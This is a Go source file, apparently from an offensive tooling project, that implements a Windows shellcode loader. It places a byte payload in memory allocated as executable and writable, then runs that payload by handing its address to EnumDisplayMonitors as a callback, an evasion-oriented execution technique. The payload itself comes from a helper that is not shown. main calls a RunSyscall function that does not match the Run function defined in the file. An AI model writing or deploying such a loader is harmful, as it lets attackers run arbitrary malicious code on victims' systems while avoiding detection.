package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func err(errmsg string) int {
	errCode := windows.GetLastError()
	fmt.Printf("Error: %s (%d)\n", errmsg, errCode)
	return 1
}

func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	user32 := windows.NewLazySystemDLL("user32.dll")

	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	enumDisplayMonitors := user32.NewProc("EnumDisplayMonitors")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		err("VirtualAlloc failed")
		return
	}

	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))
	enumDisplayMonitors.Call(0, 0, addr, 0)
}

func main() {
	RunSyscall(util.ShellCode())
}
